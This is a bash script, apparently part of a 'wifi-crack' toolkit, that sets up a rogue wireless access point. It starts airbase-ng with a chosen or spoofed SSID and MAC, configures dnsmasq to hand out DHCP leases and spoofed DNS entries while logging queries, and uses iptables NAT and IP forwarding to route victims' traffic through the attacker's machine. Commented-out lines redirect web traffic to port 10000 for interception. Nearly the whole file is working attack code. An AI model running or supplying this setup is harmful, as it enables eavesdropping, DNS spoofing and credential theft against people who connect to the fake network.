#!/bin/bash

PWD="$(pwd)"
CONFIG_DIR="$HOME/.wifi-crack"
CONFIG_FILE="$CONFIG_DIR/config.conf"
source "$CONFIG_FILE"
source "$CONFIG_INTERFACE"

source "${CONFIG_FAKEAP_FILE_DHCP}"
source "${CONFIG_FAKEAP_FILE_WIRELESS}"

touch "${CONFIG_FAKEAP_FILE_FAKEDNS}"

#edit dnsmasq configuration
echo -e "
no-resolv
no-poll
interface=at0
bind-interfaces
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,12h
dhcp-option=3,$DHCP_SERVER
dhcp-option=6,$DHCP_SERVER
server=8.8.8.8
addn-hosts=\"${CONFIG_FAKEAP_FILE_FAKEDNS}\"
dhcp-leasefile=/var/lib/misc/dnsmasq.leases
log-queries
log-dhcp
" > "${CONFIG_FAKEAP_FILE_DNSMASQ}"


#edit dhcpd configuration
#echo -e "
#Authoritative;
#Default-lease-time 600;
#Max-lease-time 7200;
#Subnet 192.168.100.0 netmask $DHCP_NETMASK {
#Option routers $DHCP_SERVER;
#Option subnet-mask $DHCP_NETMASK;
#Option domain-name “$FAKEAP_SSID”;
#Option domain-name-servers $DHCP_SERVER;
#Range $DHCP_RANGE_START $DHCP_RANGE_END;
#}
#" #> "${CONFIG_FAKEAP_FILE_DNSMASQ}"
#awk -F"." '{print $1"."$2"."$3"."1}'

#start fake ap
if [ -n "${FAKEAP_MAC}" ]; then
    $TERMINAL "airbase-ng -a $FAKEAP_MAC -e $FAKEAP_SSID -c $FAKEAP_CHANNEL $INTERFACE" &

else
    $TERMINAL "airbase-ng -e $FAKEAP_SSID -c $FAKEAP_CHANNEL $INTERFACE" &
fi
#ex: airbase-ng -e fake-ap -c 6 mon0
sleep 4


#IPTABLES
ifconfig at0 "${DHCP_SERVER}" netmask "${DHCP_NETMASK}" up
#removing iptables rules
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

#enable packet forward in iptables
iptables -P FORWARD ACCEPT
#link the wifi card and the card thats connected to the internet
iptables -t nat -A POSTROUTING -o "$INTERNET" -j MASQUERADE

#enable ip forward
echo 1 > /proc/sys/net/ipv4/ip_forward
#redirect port 80 -> 10000
#iptables –t nat –A PREROUTING –p tcp –destination-port 80 –j REDIRECT –to-port 10000

#ifconfig at0 192.168.1.1 netmask 255.255.255.0
#ifconfig at0 mtu 1400
#echo 1 > /proc/sys/net/ipv4/ip_forward
#iptables –t nat –A PREROUTNG –p udp –j DNAT –to <GATEWAY IP HERE>
#iptables –P FORWARD ACCEPT
#iptables --append FORWARD –-in-interface at0 –j ACCEPT
#iptables --table nat -append POSTROUTING --out-interface eth0 –j MASQUERADE
#iptables –t nat –A PREROUTING –p tcp –destination-port 80 –j REDIRECT –to-port 10000



#start dnsmasq
#/etc/init.d/dnsmasq restart
#dnsmasq -C "${CONFIG_FAKEAP_FILE_DNSMASQ}" -d
dnsmasq -C "${CONFIG_FAKEAP_FILE_DNSMASQ}" -H "${CONFIG_FAKEAP_FILE_FAKEDNS}" -d
